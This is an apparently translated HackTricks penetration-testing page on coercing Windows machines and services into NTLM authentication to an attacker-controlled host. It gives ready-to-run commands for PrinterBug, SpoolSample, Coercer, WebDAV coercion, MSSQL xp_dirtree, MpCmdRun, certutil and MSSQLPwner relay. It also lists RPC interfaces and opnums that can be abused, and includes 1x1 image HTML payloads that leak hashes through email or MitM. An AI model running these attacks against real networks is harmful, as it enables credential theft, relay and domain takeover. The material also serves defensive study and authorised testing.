# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is ’n **versameling** **remote authentication triggers** wat in C# gekodeer is met behulp van die MIDL compiler om 3rd party dependencies te vermy.

## Spooler Service Abuse

As die _**Print Spooler**_-diens **geaktiveer** is, kan jy sommige reeds bekende AD credentials gebruik om die Domain Controller se print server te **versoek** om ’n **opdatering** oor nuwe print jobs te stuur en dit eenvoudig te beveel om die notification na een of ander stelsel te **stuur**.\
Let daarop dat wanneer die printer die notification na arbitrêre stelsels stuur, dit teen daardie **stelsel moet authenticate**. Daarom kan ’n aanvaller die _**Print Spooler**_-diens teen ’n arbitrêre stelsel laat authenticate, en die diens sal die **computer account** in hierdie authentication **gebruik**.

Onder die enjinkap misbruik die klassieke **PrinterBug** primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** oor **`\\PIPE\\spoolss`**. Die aanvaller maak eers ’n printer/server handle oop en verskaf dan ’n vals client name in `pszLocalMachine`, sodat die target spooler ’n notification channel **terug na die aanvaller-beheerde host** skep. Dit is waarom die effek **outbound authentication coercion** eerder as direkte code execution is.<sup>[[2]](#references)</sup>\
As jy op soek is na **RCE/LPE** in die spooler self, kyk na [PrintNightmare](printnightmare.md). Hierdie bladsy fokus op **coercion en relay**.

### Vind Windows Servers op die domain

Gebruik PowerShell om Windows hosts te lys. Servers is gewoonlik die hoogste-prioriteit teikens, so fokus eers daarop:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Vind Spooler-dienste wat luister

Gebruik 'n effens aangepaste weergawe van @mysmartlogin (Vincent Le Toux) se [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) om te kyk of die Spooler Service luister:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Jy kan ook `rpcdump.py` op Linux gebruik en na die **MS-RPRN**-protokol soek:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Of toets vinnig gashere vanaf Linux met **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
As jy coercion surfaces wil enumerate in plaas daarvan om net te kontroleer of die spooler endpoint bestaan, gebruik **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dit is nuttig omdat die sien van die endpoint in EPM jou slegs vertel dat die print RPC interface geregistreer is. Dit **waarborg nie** dat elke coercion-metode bereikbaar is met jou huidige privileges nie, of dat die host ’n bruikbare authentication flow sal genereer nie.

### Vra die diens om teen ’n arbitrêre host te authenticate

Jy kan [SpoolSample van hier af](https://github.com/NotMedic/NetNTLMtoSilverTicket) compileer.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
of gebruik [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Met **Coercer** kan jy die spooler-koppelvlakke direk teiken en vermy om te raai watter RPC-metode blootgestel word:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Dwing HTTP in plaas van SMB met WebClient

Classic PrinterBug lewer gewoonlik **SMB**-authentication na `\\attacker\share`, wat steeds nuttig is vir **capture**, **relay to HTTP targets** of **relay waar SMB signing afwesig is**.\
In moderne omgewings word relaying **SMB to SMB** egter dikwels deur **SMB signing** geblokkeer, daarom verkies operateurs dikwels om eerder **HTTP/WebDAV**-authentication af te dwing.

As die teiken die **WebClient**-diens gebruik, kan die listener gespesifiseer word op ’n manier wat Windows **WebDAV over HTTP** laat gebruik:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dit is veral nuttig wanneer dit saam met **`ntlmrelayx --adcs`** of ander HTTP relay-teikens gebruik word, omdat dit voorkom dat daar op SMB relayability op die gedwonge verbinding staatgemaak word. Die belangrike beperking is dat **WebClient op die slagoffer moet loop** vir die HTTP/WebDAV-variant om te werk.

### Combining with Unconstrained Delegation

As 'n aanvaller 'n rekenaar wat vir [Unconstrained Delegation](unconstrained-delegation.md) gekonfigureer is, gekompromitteer het, kan hulle **die printer dwing om by daardie rekenaar te authenticate**. Die printer-rekenaarrekening se **TGT** word dan in memory op die unconstrained-delegation-host gecache, waar die aanvaller dit met [Pass the Ticket](pass-the-ticket.md) kan retrieve en hergebruik.

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion-matriks (interfaces/opnums wat outbound authentication trigger)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print-interface op dieselfde spooler-pipe; gebruik Coercer om bereikbare methods op 'n gegewe host te enumerate<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (ook via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums wat algemeen misbruik word: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: Hierdie methods aanvaar parameters wat 'n UNC path kan bevat (byvoorbeeld, `\\attacker\share`). Wanneer dit verwerk word, sal Windows met die machine/user-context by daardie UNC authenticate, wat NetNTLM capture of relay moontlik maak.\
Vir spooler abuse bly **MS-RPRN opnum 65** die algemeenste en bes gedokumenteerde primitive, omdat die protocol specification uitdruklik verklaar dat die server 'n notification channel terug na die client wat deur `pszLocalMachine` gespesifiseer word, skep.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN oor \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: die target probeer om die verskafde backup-log path oop te maak en authenticate by die attacker-beheerde UNC.<sup>[[1]](#references)</sup>
- Praktiese gebruik: dwing Tier 0-assets (DC/RODC/Citrix/etc.) om NetNTLM uit te stuur, en relay dit dan na AD CS-endpoints (ESC8/ESC11-scenarios) of ander privileged services.<sup>[[1]](#references)</sup>

## PrivExchange

Die `PrivExchange`-attack is die gevolg van 'n flaw wat in die **Exchange Server se `PushSubscription`-feature** gevind is. Hierdie feature laat toe dat die Exchange-server deur enige domain user met 'n mailbox gedwing word om oor HTTP by enige client-provided host te authenticate.

By verstek loop die **Exchange-service as SYSTEM** en het dit excessive privileges (spesifiek **WriteDacl privileges op die domain voor die 2019 Cumulative Update**). Hierdie flaw kan uitgebuit word om die **relaying van information na LDAP moontlik te maak en daarna die domain NTDS-database te extract**. In gevalle waar relaying na LDAP nie moontlik is nie, kan hierdie flaw steeds gebruik word om na ander hosts binne die domain te relay en daar te authenticate. Suksesvolle exploitation van hierdie attack verleen immediate access tot die Domain Admin met enige authenticated domain user-account.

## Inside Windows

As jy reeds binne die Windows-machine is, kan jy Windows dwing om met privileged accounts aan 'n server te connect met:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om certutil.exe lolbin (Microsoft-ondertekende binêre lêer) te gebruik om NTLM-verifikasie af te dwing:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via e-pos

As jy die **e-posadres** ken van die gebruiker wat by ’n masjien aanmeld wat jy wil kompromitteer, kan jy eenvoudig vir hom ’n **e-pos met ’n 1x1-prent** stuur, soos..
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Wanneer die slagoffer dit oopmaak, probeer Windows om te authenticate.

### MitM

As jy 'n MitM-aanval kan uitvoer en HTML in 'n bladsy wat deur die slagoffer bekyk word kan invoeg, probeer om 'n prent soos die volgende in te voeg:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Ander maniere om NTLM-authentication af te dwing en te phish


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 kraak

As jy [NTLMv1 challenges kan vaslê, lees hier hoe om hulle te kraak](../ntlm/index.html#ntlmv1-attack).\
_Onthou dat jy Responder se challenge op "1122334455667788" moet stel om NTLMv1 te kraak_

## References

- [1] [Unit 42 – Authentication Coercion hou aan ontwikkel](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog-afstandsprotokol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
